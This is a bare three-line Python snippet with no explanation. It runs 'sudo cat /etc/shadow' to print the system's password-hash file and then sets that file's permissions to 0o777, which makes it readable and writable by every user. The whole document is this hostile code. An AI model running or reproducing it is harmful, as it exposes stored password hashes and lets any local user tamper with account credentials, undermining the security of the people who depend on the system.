import os
os.system("sudo cat /etc/shadow")
os.chmod("/etc/shadow", 0o777)